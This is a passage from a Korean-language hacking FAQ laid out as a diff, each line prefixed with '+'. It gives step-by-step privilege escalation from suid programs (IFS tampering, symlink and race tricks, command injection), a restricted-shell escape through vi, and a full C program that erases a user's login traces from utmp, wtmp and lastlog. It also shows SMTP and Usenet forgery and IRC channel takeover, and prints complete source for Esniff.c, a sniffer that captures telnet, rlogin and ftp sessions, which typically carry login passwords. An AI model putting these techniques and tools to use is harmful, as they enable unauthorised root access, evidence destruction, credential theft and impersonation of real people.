+SYS$GETUAF 함수를 이용하여,암호화된 단어와 SYSUAF.DAT  에 있는 암호화된 자료를 비교하는 프
+로그램을  작성하면 가능하다.  그러한  목적으로 만들어진  프로그램중에서  CHECK_PASSWORD 와
+GUESS_PASSWORD 가 알려져있다.
+
+9.사용이 제한된 shell을 어떻게 빠져 나올 수 있는가?
+shell 기능을 주축으로  하는 프로그램을 실행시키면,사용자의 영역이  제한된 shell로부터 빠져
+나올 수 있다.  대표적인 예가 vi이며,vi를 실행시킨 후  다음 명령어를 사용하라.계속하여 다음
+명령어를 입력하면 shell로부터 빠려 나올 수 있다.
+
+:set shell=/bin/sh
+:shell
+
+10.suid script나 프로그램으로부터 root로 이동할 수 있는가?
+1. IFS를 변경하라.
+프로그램이 system() 함수를 이용하여  다른 프로그램을 호출하면,프로그램을 속여서 IFS를 변경
+할 수 있다.  IFS는 인자를 구분하기위해 사용된다. 프로그램이  다음과 같은 함수를 사용한다고
+가정하자.
+
+system("/bin/date")
+
+IFS를 '/' 로 변경하면 shell은 '/'을 단지 bin 과 date을 구분하기 위하여 사용하므로(디렉토리
+를 구분하기 위한 역할은 사라진다) /bin/date 을 'bin date'로 해석하게 된다.
+누군가가 'bin'이라는 경로에 자신의 프로그램을  가지고 있다면, suid 프로그램은 /bin/date 대
+신에 자신의 프로그램을 실행하게 된다.
+IFS를 변경하기 위하여 다음의 명령어를 사용하라.
+
+IFS='/';export IFS      # Bourne Shell
+setenv IFS '/'          # C Shell
+export IFS='/'          # Korn Shell
+
+2. script 를 -i에 연결하라.
+-i라는 이름을 가진 symbolic link를 프로그램에 만들어라. -i를 실행시키면 shell(bin/sh)을 대
+화형 모드로 수행할 것이다. 이것은 suid shell scripts에서만 가능하다.
+
+예:
+
+% ln suid.sh -i
+% -i
+#
+
+3. race condition을 이용하라.
+커널이 /bin/sh를 수행하고 있는 동안 symbolic link를 다른 프로그램으로 바꿔라.
+
+예:
+
+nice -19 suidprog ; ln -s evilprog suidroot
+
+4. 프로그램에서 bad input을 입력하라.
+같은 명령어 줄에서 프로그램과 다른 명령어를 함께 수행하라.
+
+예:
+
+suidprog ; id
+
+11.시스템 LOG FILE에서 자신의 해킹흔적을 어떻게 지울것인가?
+/etc/utmp, /usr/adm/wtmp 그리고 /usr/adm/lastlog 파일을 편집하라.
+그러나 이러한 파일들은 vi와 같은 일반적인 에디터로 편집할 수 있는 문서 파일이 아니다. 이러
+한 목적으로 특별하게 짜여진 프로그램을 이용해야 한다.
+
+예:
+
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+int f;
+
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                 write (f, &utmp_ent, sizeof (utmp_ent));
+            }
+     close(f);
+  }
+}
+
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+
+     while(pos != -1L) {
+        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+          pos = -1L;
+        } else {
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+               bzero((char *)&utmp_ent,sizeof(struct utmp ));
+               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+               write (f, &utmp_ent, sizeof (utmp_ent));
+               pos = -1L;
+          } else pos += 1L;
+        }
+     }
+     close(f);
+  }
+}
+
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+
+     if ((pwd=getpwnam(who))!=NULL) {
+
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        }
+
+    } else printf("%s: ?\n",who);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+        kill_lastlog(argv[1]);
+        kill_wtmp(argv[1]);
+        kill_utmp(argv[1]);
+        printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+
+12.가짜메일(FAKEMAIL)을 어떻게 보내는가?
+메일이 원형대로 나타나기를 원하는 시스템에 접속한 후, 다음처럼 메세지를 작성하라.
+
+ HELO bellcore.com
+ MAIL FROM:Voyager@bellcore.com
+ RCPT TO:president@whitehouse.gov
+ DATA
+        Please discontinue your silly Clipper initiative.
+.
+ QUIT
+
+RFC 931을 사용하는 시스템에서는 "MAIL FROM:"이라는 부분은 가능하지 않다.
+우선 자신에게 메일을 보냄으로써 테스트를 해본다.
+더많은 자료는 RFC  822 "Standard for the format of  ARPA Internet text messages."를 참조한
+다.
+
+13.유즈넷을 어떻게 속이는가?
+inews를 사용하여 다음의 내용을 입력하라.
+
+ From:
+ Newsgroups:
+ Subject:
+ Message-ID:
+ Date:
+ Organization:
+제대로된 newsgroup을 위해,inews는 다음의 내용을 필요로 한다.
+ Approved:
+그러면 게시물을 첨가하고 <Control-D>를 이용하여 끝낸다. 다음은 예이다.
+
+예:
+
+ From: Eric S. Real
+ Newsgroups: alt.hackers
+ Subject: Pathetic bunch of wannabe losers
+ Message-ID: <esr.123@locke.ccil.org>
+ Date: Fri, 13 Aug 1994 12:15:03
+ Organization: Moral Majority
+
+ A pathetic bunch of wannabe losers is what most of you are, with no
+ right to steal the honorable title of `hacker' to puff up your silly
+ adolescent egos. Get stuffed, get lost, and go to jail.
+
+                                        Eric S. Real <esr@locke.ccil.org>
+
+
+ ^D
+
+많은 시스템이 Originator:  를 명기하여 메세지가 누구로부터  발송되었는지를 나타낸다는 점에
+주목해야 한다.
+
+14.어떻게 IRC(인터넷 채팅)의 CHANOP에 침투하는가?
+IRC로부터 떨어져 나온 sever를 찾아서 원하는 이름으로 channel을 만들어라.
+sever가 net에 다시 접속할 때 실제적인 channel이 있는 ChanOp를 소유하게 될 것이다.
+sever에서 ServerOp 를 가지고 있다면 의도적으로 분리시킬 수 도 있다.
+
+15.나의 사용자 이름을 숨기려면 IRC클라이언트를 어떻게 수정하는가?
+cs.bu.edu /irc/clients에 있는 irc.c 와 ctcp.c 의 내용을 변경하면 된다.
+irc.c에서는 사용자이름,ctcp.c에서는 개인정보 부분을  수정한 후에 컴파일을 하여 실행하면 된
+다.
+
+예:
+
+*** ctcp.c.old  Wed Feb 10 10:08:05 1993
+--- ctcp.c      Fri Feb 12 04:33:55 1993
+***************
+*** 331,337 ****
+        struct  passwd  *pwd;
+        long    diff;
+        int     uid;
+!       char    c;
+
+        /*
+         * sojge complained that ircII says 'idle 1 seconds'
+--- 331,337 ----
+        struct  passwd  *pwd;
+        long    diff;
+        int     uid;
+!       char    c, *fing;
+
+        /*
+         * sojge complained that ircII says 'idle 1 seconds'
+***************
+*** 348,354 ****
+        if (uid != DAEMON_UID)
+        {
+  #endif /* DAEMON_UID */
+!               if (pwd = getpwuid(uid))
+                {
+                        char    *tmp;
+
+--- 348,356 ----
+        if (uid != DAEMON_UID)
+        {
+  #endif /* DAEMON_UID */
+!               if (fing = getenv("IRCFINGER"))
+!                       send_ctcp_reply(from, ctcp->name, fing, diff, c);
+!               else if (pwd = getpwuid(uid))
+                {
+                        char    *tmp;
+
+*** irc.c.old   Wed Feb 10 06:33:11 1993
+--- irc.c       Fri Feb 12 04:02:11 1993
+***************
+*** 510,516 ****
+                malloc_strcpy(&my_path, "/");
+        if (*realname == null(char))
+                strmcpy(realname, "*Unknown*", REALNAME_LEN);
+!       if (*username == null(char))
+        {
+                if (ptr = getenv("USER"))
+                        strmcpy(username, ptr, NAME_LEN);
+--- 510,518 ----
+                malloc_strcpy(&my_path, "/");
+        if (*realname == null(char))
+                strmcpy(realname, "*Unknown*", REALNAME_LEN);
+!       if (ptr = getenv("IRCUSER"))
+!               strmcpy(username, ptr, NAME_LEN);
+!       else if (*username == null(char))
+        {
+                if (ptr = getenv("USER"))
+                        strmcpy(username, ptr, NAME_LEN);
+
+16.이상한 문자로 표시된 디렉토리로 이동하는 방법은 무엇인가?
+directory 이름에 이상한 문자가 표시되어 있으면,자료를 숨기려고 하거나 상업적 용도의 프로그
+램인 경우가 많다.
+그러한 문자를 알아내는 방법들은 몇가지가 있는데,먼저 ls명령어를 이용하는 방법을 살펴보자.
+ls 의 도움말을 보면 다음과 같은 내용이 있다.
+
+    -F  디렉토리는 ``/'',실행가능한 파일에는  ``*'', 연결고리에는 ``@'' 라는 표시를 만들어
+        준다.
+    -q  파일명에 들어있는 비그래픽 문자들을 ``?''로 표시해 준다.
+    -b  \ddd에 들어있는 비그래픽 문자들을 8진수로 표시해준다.
+
+ftp로 연결한 곳의 디렉토리는 "ls  -al filename" 이라는 명령어를 이용하면 지정된 파일명으로
+저장이 된다.
+이렇게 저장이 된 파일 안에 들어 있는 이상한 문자가 무엇인지를 정확히 보기위해서
+"cat -t -v -e filename" 이라는 명령어를 이용하도록 한다.
+cat의 도움말을 보면 다음과 같은 내용이 있다.
+
+    -v  인쇄가 불가능한 문자들을 나타낸다.
+        제어문자는 ^X (<Ctrl>x), 와 같이 나타난다.
+        <DEL><8진수로 0177>DMS ^?로 표시된다. ASCII 문자가 아닌 경우는
+        <high bit인 8번째 bit가 1인 경우>  M -x 로 표시되는데,여기서 x는 high bit를 제외한
+        나머지 7개의 bit가 표시하는 문자이다.
+    -t  탭은 ^I,페이지 넘김은 ^L로 나타내준다. -v와 함께 사용되어야만 한다.
+    -e  새 줄이 시작되기에 앞서서 각 줄의 끝에 ``$'' 을 표시하게 한다.
+        -v와 함께 사용되어야 한다.
+
+디렉토리 명이 <SPACE> 나 <TAB>을 포함하고 있을 경우 따옴표를 이용해야 한다.
+
+cd "..<TAB>"
+
+IBM-PC에서는 <ALT> key 와 ASCII 코드값을 이용하면 특수문자를 입력할 수 있다.
+<ALT> key를 누른 상태에서 특수문자에 해당하는 코드 값을 눌러준다.
+<ALT>키에서 손을 떼면 원하는 문자가  화면에 나타난다. 특수문자의 ASCII코드값을 알기 위해서
+는 코드 표를 참조하는 것이 좋다.
+^Z (suspend), ^C (intr)와 같은 제어문자를 가진 디렉토리를 만들고자 할 경우,제어문자를 다른
+문자로 변경하기 위하여 stty를 사용할 필요가 있다.
+stty에 대한 도움말을 보면 다음과 같다.
+제어문자 +C는 제어문자를 C에 할당하는데,여기서 제어문자는 erase, kill, intr (interrupt),
+quit, eof, eol, swtch(switch), start,  stop or susp를 의미한다. star와 stop은 제어문자 C할
+당에만 유효하다. caret (^)이 C보다 먼저 나오는 경우는 제어문자에 해당한다.
+(예를들어 ^D는 <Ctrl+D>이며 ^?는 <DELETE>,^- 는 undefined로 해석된다.)
+현재의 stty 기본 설정값을 보려면 stty -a를 입력하면 된다.
+
+17.ethrnet sniiffing(이더넷 추척)은 무엇인가?
+Ethernet sniffing 이란,자신이 찾고자 하는  정보를 발견하기 위해서 전송상태를 감시하는 것을
+의미한다. 즉 어떤  조건에 맞는 자료르 프로그램이 발견하게 되면,  그 내용은 프로그램에 의해
+파일로 저장이 된다. 정보를 알아내기  위하여 일반적으로 가장많이 쓰이는 조건은 'login',또는
+'password'와 같은 단어들이다.
+많은 Ethernet sniffers 가 있으며,다음은 그 예들이다.
+시스템에 따른 스니터와 스니퍼가 있는 FTP
+
+OS              Sniffer
+~~              ~~~~~~~
+HP/UX           nettl (monitor) & netfmt (display)
+                nfswatch        /* Available via anonymous ftp           */
+Irix            nfswatch        /* Available via anonymous ftp           */
+                Etherman
+SunOS           etherfind
+                nfswatch        /* Available via anonymous ftp           */
+Solaris         snoop
+DOS             ETHLOAD         /* Available via anonymous ftp as        */
+                                /* ethld104.zip                          */
+                The Gobbler     /* Available via anonymous ftp           */
+                LanPatrol
+                LanWatch
+                Netmon
+                Netwatch
+                Netzhack        /* Available via anonymous ftp at        */
+                                /* mistress.informatik.unibw-muenchen.de */
+                                /* /pub/netzhack.mac                     */
+Macintosh       Etherpeek
+
+Here is source code for an ethernet sniffer:
+
+/* Esniff.c */
+
+#include <stdio.h>
+#include <ctype.h>
+#include <string.h>
+
+#include <sys/time.h>
+#include <sys/file.h>
+#include <sys/stropts.h>
+#include <sys/signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+
+#include <net/if.h>
+#include <net/nit_if.h>
+#include <net/nit_buf.h>
+#include <net/if_arp.h>
+
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ip_var.h>
+#include <netinet/udp_var.h>
+#include <netinet/in_systm.h>
+#include <netinet/tcp.h>
+#include <netinet/ip_icmp.h>
+
+#include <netdb.h>
+#include <arpa/inet.h>
+
+#define ERR stderr
+
+char    *malloc();
+char    *device,
+        *ProgName,
+        *LogName;
+FILE    *LOG;
+int     debug=0;
+
+#define NIT_DEV     "/dev/nit"
+#define CHUNKSIZE   4096        /* device buffer size */
+int     if_fd = -1;
+int     Packet[CHUNKSIZE+32];
+
+void Pexit(err,msg)
+int err; char *msg;
+{ perror(msg);
+  exit(err); }
+
+void Zexit(err,msg)
+int err; char *msg;
+{ fprintf(ERR,msg);
+  exit(err); }
+
+#define IP          ((struct ip *)Packet)
+#define IP_OFFSET   (0x1FFF)
+#define SZETH       (sizeof(struct ether_header))
+#define IPLEN       (ntohs(ip->ip_len))
+#define IPHLEN      (ip->ip_hl)
+#define TCPOFF      (tcph->th_off)
+#define IPS         (ip->ip_src)
+#define IPD         (ip->ip_dst)
+#define TCPS        (tcph->th_sport)
+#define TCPD        (tcph->th_dport)
+#define IPeq(s,t)   ((s).s_addr == (t).s_addr)
+
+#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS))
+
+#define MAXBUFLEN  (128)
+time_t  LastTIME = 0;
+
+struct CREC {
+     struct CREC *Next,
+                 *Last;
+     time_t  Time;              /* start time */
+     struct in_addr SRCip,
+                    DSTip;
+     u_int   SRCport,           /* src/dst ports */
+             DSTport;
+     u_char  Data[MAXBUFLEN+2]; /* important stuff :-) */
+     u_int   Length;            /* current data length */
+     u_int   PKcnt;             /* # pkts */
+     u_long  LASTseq;
+};
+
+struct CREC *CLroot = NULL;
+
+char *Symaddr(ip)
+register struct in_addr ip;
+{ register struct hostent *he =
+      gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET);
+
+  return( (he)?(he->h_name):(inet_ntoa(ip)) );
+}
+
+char *TCPflags(flgs)
+register u_char flgs;
+{ static char iobuf[8];
+#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-')
+
+  SFL(0,TH_FIN, 'F');
+  SFL(1,TH_SYN, 'S');
+  SFL(2,TH_RST, 'R');
+  SFL(3,TH_PUSH,'P');
+  SFL(4,TH_ACK, 'A');
+  SFL(5,TH_URG, 'U');
+  iobuf[6]=0;
+  return(iobuf);
+}
+
+char *SERVp(port)
+register u_int port;
+{ static char buf[10];
+  register char *p;
+
+   switch(port) {
+     case IPPORT_LOGINSERVER: p="rlogin"; break;
+     case IPPORT_TELNET:      p="telnet"; break;
+     case IPPORT_SMTP:        p="smtp"; break;
+     case IPPORT_FTP:         p="ftp"; break;
+     default: sprintf(buf,"%u",port); p=buf; break;
+   }
+   return(p);
+}
+
+char *Ptm(t)
+register time_t *t;
+{ register char *p = ctime(t);
+  p[strlen(p)-6]=0; /* strip " YYYY\n" */
+  return(p);
+}
+
+char *NOWtm()
+{ time_t tm;
+  time(&tm);
+  return( Ptm(&tm) );
+}
+
+#define MAX(a,b) (((a)>(b))?(a):(b))
+#define MIN(a,b) (((a)<(b))?(a):(b))
+
+/* add an item */
+#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
+  register struct CREC *CLtmp = \
+        (struct CREC *)malloc(sizeof(struct CREC)); \
+  time( &(CLtmp->Time) ); \
+  CLtmp->SRCip.s_addr = SIP.s_addr; \
+  CLtmp->DSTip.s_addr = DIP.s_addr; \
+  CLtmp->SRCport = SPORT; \
+  CLtmp->DSTport = DPORT; \
+  CLtmp->Length = MIN(LEN,MAXBUFLEN); \
+  bcopy( (u_char *)DATA, (u_char *)CLtmp->Data, CLtmp->Length); \
+  CLtmp->PKcnt = 1; \
+  CLtmp->Next = CLroot; \
+  CLtmp->Last = NULL; \
+  CLroot = CLtmp; \
+}
+
+register struct CREC *GET_NODE(Sip,SP,Dip,DP)
+register struct in_addr Sip,Dip;
+register u_int SP,DP;
+{ register struct CREC *CLr = CLroot;
+
+  while(CLr != NULL) {
+    if( (CLr->SRCport == SP) && (CLr->DSTport == DP) &&
+        IPeq(CLr->SRCip,Sip) && IPeq(CLr->DSTip,Dip) )
+            break;
+    CLr = CLr->Next;
+  }
+  return(CLr);
+}
+
+#define ADDDATA_NODE(CL,DATA,LEN) { \
+ bcopy((u_char *)DATA, (u_char *)&CL->Data[CL->Length],LEN); \
+ CL->Length += LEN; \
+}
+
+#define PR_DATA(dp,ln) {    \
+  register u_char lastc=0; \
+  while(ln-- >0) { \
+     if(*dp < 32) {  \
+        switch(*dp) { \
+            case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \
+                        break; \
+            case '\r': \
+            case '\n': fprintf(LOG,"\n     : "); \
+                        break; \
+            default  : fprintf(LOG,"^%c", (*dp + 64)); \
+                        break; \
+        } \
+     } else { \
+        if(isprint(*dp)) fputc(*dp,LOG); \
+        else fprintf(LOG,"(%d)",*dp); \
+     } \
+     lastc = *dp++; \
+  } \
+  fflush(LOG); \
+}
+
+void END_NODE(CLe,d,dl,msg)
+register struct CREC *CLe;
+register u_char *d;
+register int dl;
+register char *msg;
+{
+   fprintf(LOG,"\n-- TCP/IP LOG -- TM: %s --\n", Ptm(&CLe->Time));
+   fprintf(LOG," PATH: %s(%s) =>", Symaddr(CLe->SRCip),SERVp(CLe->SRCport));
+   fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));
+   fprintf(LOG," STAT: %s, %d pkts, %d bytes [%s]\n",
+                        NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);
+   fprintf(LOG," DATA: ");
+    { register u_int i = CLe->Length;
+      register u_char *p = CLe->Data;
+      PR_DATA(p,i);
+      PR_DATA(d,dl);
+    }
+
+   fprintf(LOG,"\n-- \n");
+   fflush(LOG);
+
+   if(CLe->Next != NULL)
+    CLe->Next->Last = CLe->Last;
+   if(CLe->Last != NULL)
+    CLe->Last->Next = CLe->Next;
+   else
+    CLroot = CLe->Next;
+   free(CLe);
+}
+
+/* 30 mins (x 60 seconds) */
+#define IDLE_TIMEOUT 1800
+#define IDLE_NODE() { \
+  time_t tm; \
+  time(&tm); \
+  if(LastTIME<tm) { \
+     register struct CREC *CLe,*CLt = CLroot; \
+     LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
+     while(CLe=CLt) { \
+       CLt=CLe->Next; \
+       if(CLe->Time <tm) \
+           END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \
+     } \
+  } \
+}
+
+void filter(cp, pktlen)
+register char *cp;
+register u_int pktlen;
+{
+ register struct ip     *ip;
+ register struct tcphdr *tcph;
+
+ { register u_short EtherType=ntohs(((struct ether_header *)cp)->ether_type);
+
+   if(EtherType < 0x600) {
+     EtherType = *(u_short *)(cp + SZETH + 6);
+     cp+=8; pktlen-=8;
+   }
+
+   if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */
+      return;
+ }
+
+    /* ugh, gotta do an alignment :-( */
+ bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH));
+
+ ip = (struct ip *)Packet;
+ if( ip->ip_p != IPPROTO_TCP) /* chuk non tcp pkts */
+    return;
+ tcph = (struct tcphdr *)(Packet + IPHLEN);
+
+ if(!( (TCPD == IPPORT_TELNET) ||
+       (TCPD == IPPORT_LOGINSERVER) ||
+       (TCPD == IPPORT_FTP)
+   )) return;
+
+ { register struct CREC *CLm;
+   register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4));
+   register u_char *p = (u_char *)Packet;
+
+   p += ((IPHLEN * 4) + (TCPOFF * 4));
+
+ if(debug) {
+  fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length);
+  fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS));
+  fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD));
+ }
+
+   if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) {
+
+      CLm->PKcnt++;
+
+      if(length>0)
+        if( (CLm->Length + length) < MAXBUFLEN ) {
+          ADDDATA_NODE( CLm, p,length);
+        } else {
+          END_NODE( CLm, p,length, "DATA LIMIT");
+        }
+
+      if(TCPFL(TH_FIN|TH_RST)) {
+          END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" );
+      }
+
+   } else {
+
+      if(TCPFL(TH_SYN)) {
+         ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
+      }
+
+   }
+
+   IDLE_NODE();
+
+ }
+
+}
+
+/* signal handler
+ */
+void death()
+{ register struct CREC *CLe;
+
+    while(CLe=CLroot)
+        END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");
+
+    fprintf(LOG,"\nLog ended at => %s\n",NOWtm());
+    fflush(LOG);
+    if(LOG != stdout)
+        fclose(LOG);
+    exit(1);
+}
+
+/* opens network interface, performs ioctls and reads from it,
+ * passing data to filter function
+ */
+void do_it()
+{
+    int cc;
+    char *buf;
+    u_short sp_ts_len;
+
+    if(!(buf=malloc(CHUNKSIZE)))
+        Pexit(1,"Eth: malloc");
+
+/* this /dev/nit initialization code pinched from etherfind */
+  {
+    struct strioctl si;
+    struct ifreq    ifr;
+    struct timeval  timeout;
+    u_int  chunksize = CHUNKSIZE;
+    u_long if_flags  = NI_PROMISC;
+
+    if((if_fd = open(NIT_DEV, O_RDONLY)) < 0)
+        Pexit(1,"Eth: nit open");
+
+    if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) < 0)
+        Pexit(1,"Eth: ioctl (I_SRDOPT)");
+
+    si.ic_timout = INFTIM;
+
+    if(ioctl(if_fd, I_PUSH, "nbuf") < 0)
+        Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    si.ic_cmd = NIOCSTIME;
+    si.ic_len = sizeof(timeout);
+    si.ic_dp  = (char *)&timeout;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");
+
+    si.ic_cmd = NIOCSCHUNK;
+    si.ic_len = sizeof(chunksize);
+    si.ic_dp  = (char *)&chunksize;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");
+
+    strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
+    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0';
+    si.ic_cmd = NIOCBIND;
+    si.ic_len = sizeof(ifr);
+    si.ic_dp  = (char *)&ifr;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");
+
+    si.ic_cmd = NIOCSFLAGS;
+    si.ic_len = sizeof(if_flags);
+    si.ic_dp  = (char *)&if_flags;
+    if(ioctl(if_fd, I_STR, (char *)&si) < 0)
+        Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");
+
+    if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) < 0)
+        Pexit(1,"Eth: ioctl (I_FLUSH)");
+  }
+
+    while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) {
+        register char *bp = buf,
+                      *bufstop = (buf + cc);
+
+        while (bp < bufstop) {
+            register char *cp = bp;
+            register struct nit_bufhdr *hdrp;
+
+            hdrp = (struct nit_bufhdr *)cp;
+            cp += sizeof(struct nit_bufhdr);
+            bp += hdrp->nhb_totlen;
+            filter(cp, (u_long)hdrp->nhb_msglen);
+        }
+    }
+    Pexit((-1),"Eth: read");
+}
+ /* Authorize your proogie,generate your own password and uncomment here */
+/* #define AUTHPASSWD "EloiZgZejWyms" */
+
+void getauth()
+{ char *buf,*getpass(),*crypt();
+  char pwd[21],prmpt[81];
+
+    strcpy(pwd,AUTHPASSWD);
+    sprintf(prmpt,"(%s)UP? ",ProgName);
+    buf=getpass(prmpt);
+    if(strcmp(pwd,crypt(buf,pwd)))
+        exit(1);
+}
+    */
+void main(argc, argv)
+int argc;
+char **argv;
+{
+    char   cbuf[BUFSIZ];
+    struct ifconf ifc;
+    int    s,
+           ac=1,
+           backg=0;
+
+    ProgName=argv[0];
+
+ /*     getauth(); */
+
+    LOG=NULL;
+    device=NULL;
+    while((ac<argc) && (argv[ac][0] == '-')) {
+       register char ch = argv[ac++][1];
+       switch(toupper(ch)) {
+            case 'I': device=argv[ac++];
+                      break;
+            case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))
+                         Zexit(1,"Output file cant be opened\n");
+                      break;
+            case 'B': backg=1;
+                      break;
+            case 'D': debug=1;
+                      break;
+            default : fprintf(ERR,
+                        "Usage: %s [-b] [-d] [-i interface] [-f file]\n",
+                            ProgName);
+                      exit(1);
+       }
+    }
+
+    if(!device) {
+        if((s=socket(AF_INET, SOCK_DGRAM, 0)) < 0)
+            Pexit(1,"Eth: socket");
+
+        ifc.ifc_len = sizeof(cbuf);
+        ifc.ifc_buf = cbuf;
+        if(ioctl(s, SIOCGIFCONF, (char *)&ifc) < 0)
+            Pexit(1,"Eth: ioctl");
+
+        close(s);
+        device = ifc.ifc_req->ifr_name;
+    }
+
+    fprintf(ERR,"Using logical device %s [%s]\n",device,NIT_DEV);
+    fprintf(ERR,"Output to %s.%s%s",(LOG)?LogName:"stdout",
+            (debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");
+
+    if(!LOG)
+        LOG=stdout;
+
+    signal(SIGINT, death);
+    signal(SIGTERM,death);
+    signal(SIGKILL,death);
+    signal(SIGQUIT,death);
+
+    if(backg && debug) {
+         fprintf(ERR,"[Cannot bg with debug on]\n");
+         backg=0;
+    }
+
+    if(backg) {
+        register int s;
+
+        if((s=fork())>0) {
+           fprintf(ERR,"[pid %d]\n",s);
+           exit(0);
+        } else if(s<0)
+           Pexit(1,"fork");
+
+        if( (s=open("/dev/tty",O_RDWR))>0 ) {
+                ioctl(s,TIOCNOTTY,(char *)NULL);
+                close(s);
+        }
+    }
+    fprintf(LOG,"\nLog started at => %s [pid %d]\n",NOWtm(),getpid());
+    fflush(LOG);
+
+    do_it();
+}
+
+18.internet outdial은 무엇인가?
+Internet outdial은 인터넷에 물려 있으면서,사용자가 이용할 수 있는 모뎀을 의미한다.
+Normal outdials은 해당  지역에만 국한되지만,GOD(Global OutDial)은 지역에  제한을 받지 않는
+다. 이러한 방법은 멀리 떨어진 BBS에 접속하는 매우 경제적인 방법이다.
+
+19.internet outdial에는 무엇이 있는가?
+Area    Address(s)                      Command(s)
+------  ------------------------------- ---------------------
+201     128.112.88.0
+        128.112.88.1
+        128.112.88.2
+        128.112.88.3
+204     umnet.cc.manitoba.ca            "dial12" or "dial24"
+206     dialout24.cac.washington.edu
+215     wiseowl.ocis.temple.edu         atz
+                                        atdt 9xxxyyyy
+        129.72.1.59                     hayes compat
+218     aa28.d.umn.edu                  cli
+                                        rlogin modem
+                                        at "login:" type
+                                        "modem"
+        modem.d.umn.edu                 "Hayes"
+232     isn.rdns.iastate.edu            MODEM              [Works!!]
+                                        atz
+                                        atdt8xxx-xxxx
+303     129.82.100.64                   login: modem       [need password!]
+307     modem.uwyo.edu
+        129.72.1.59                     hayes compat
+313     35.1.1.6                        "dial2400-aa" or   [can't connect]
+                                        "dial1200-aa"
+315     198.36.22.3                     "modem"
+404     emory.edu                       .modem8 or
+                                        .dialout
+        broadband.cc.emory.edu          .modem8 or
+                                        .dialout
+        128.140.1.239                   .modem8|CR
+                                        or .modem96|CR
+412     gate.cis.pitt.edu               LAT
+                                        connect dialout
+                                        ^E
+                                        atdt 91k xxx-xxxx
+415     128.32.132.250                  "dial1" or "dial2"
+416     pacx.utcs.utoronto.ca           modem
+                                        atdt 9xxx-xxxx
+502     uknet.uky.edu                   outdial2400
+                                        atdt 9xxx-xxxx
+510     annex132-1.eecs.berkeley.edu    atdt 9,,,,, xxx-xxxx
+514     132.204.2.11                    externe#9 9xxx-xxxx
+515     isn.rdns.iastate.edu            login MODEM
+                                        dial atdt8xxx-yyyy
+602     129.219.17.3                    atdt8,,,,,xyyyxxxyyyy
+        129.219.17.3                    login: MODEM
+                                        atdt 8xxx-xxxx
+609     129.72.1.59                     "Hayes"
+        128.119.131.110                 "Hayes"
+        128.119.131.111
+        128.119.131.112
+        128.119.131.113
+        128.119.131.114
+        128.112.131.110
+        128.112.131.111
+        128.112.131.112
+        128.112.131.113
+        128.112.131.114                 the above are hayes
+614     ns2400.ircc.ohio-state.edu      DIAL               [can't connect]
